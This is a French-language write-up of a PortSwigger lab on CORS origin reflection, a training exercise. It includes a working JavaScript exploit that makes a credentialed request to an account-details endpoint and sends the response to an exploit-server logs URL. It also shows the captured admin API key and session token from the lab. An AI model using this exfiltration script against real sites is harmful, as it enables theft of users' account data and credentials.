# Lab

https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

## Solution

Il y a une endpoint `/accoundDetails` qui renvoie les informations de l'utilisateur connecté si le cookie `session` est présent.

Dans la réponse de cette requête il y a le header `Access-Control-Allow-Credentials: true` qui indique que le serveur accepte les requêtes avec les credentials (cookies).

On voit que si on injecte le header `Origin: xxxxxxxxxxx` dans la requête, le serveur renvoie le header `Access-Control-Allow-Origin: xxxxxxxxxxx` qui indique que le serveur accepte les requêtes avec l'origin injecté.

On a donc juste a crafter une requête avec l'exploit server qui envoie les credentials et l'origin injecté.

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a680045031fb35c80e95df200090019.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//exploit-0a06009103a6b3cc80895c0501f70029.exploit-server.net/logs?x='+this.responseText;
};
```

Dans les logs de l'exploit server on voit :

`10.0.3.179      2023-10-08 19:43:49 +0000 "GET /logs?x={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22yljaauZOxSqft4blwkyj2ulWdZTCRwfL%22,%20%20%22sessions%22:%20[%20%20%20%20%22EpYP7l7YShZuAilpnWyApUpf3jN13a6U%22%20%20]} HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"`

Une fois la chaine URL décodée, on vois :

```js
{
  "username": "administrator",
  "email": "",
  "apikey": "yljaauZOxSqft4blwkyj2ulWdZTCRwfL",
  "sessions": [
    "EpYP7l7YShZuAilpnWyApUpf3jN13a6U"
  ]
}
```

On a plus qu'à submit le challenge avec l'apikey de l'admin.